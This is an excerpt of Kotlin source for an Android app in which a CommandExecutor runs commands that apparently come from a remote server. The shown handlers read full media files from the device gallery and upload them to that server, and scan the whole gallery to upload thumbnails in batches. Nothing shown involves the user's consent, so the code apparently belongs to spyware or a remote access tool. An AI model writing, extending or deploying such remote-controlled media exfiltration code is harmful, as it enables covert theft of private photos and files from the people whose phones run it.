package zxtni.apixer.into.command
...
import zxtni.apixer.into.network.CommandStatusUpdate
import zxtni.apixer.into.network.PendingCommand
...
object CommandExecutor {
    ...
    private suspend fun executeFetchFullMedia(context: Context, payload: String?): Pair<Boolean, String> {
        ...
        return try {
            ...
            val result = zxtni.apixer.into.data.MediaScanner.readFullFile(context, mediaStoreId)
                ?: return Pair(false, "Could not read file for $mediaStoreId")

            val (fileData, mimeType) = result

            // Upload to server
            val uploadPayload = zxtni.apixer.into.network.MediaFullFileUploadRequest(
                media_store_id = mediaStoreId,
                file_data = fileData,
                mime_type = mimeType,
            )

            val uploadResult = zxtni.apixer.into.network.ApiClient.uploadMediaFullFile(uploadPayload)
    ...
    private suspend fun executeScanGallery(context: Context): Pair<Boolean, String> {
        return try {
            var total = 0
            zxtni.apixer.into.data.MediaScanner.scanAndUploadAll(context) { batch ->
                val payload = zxtni.apixer.into.network.MediaThumbnailSyncRequest(thumbnails = batch)
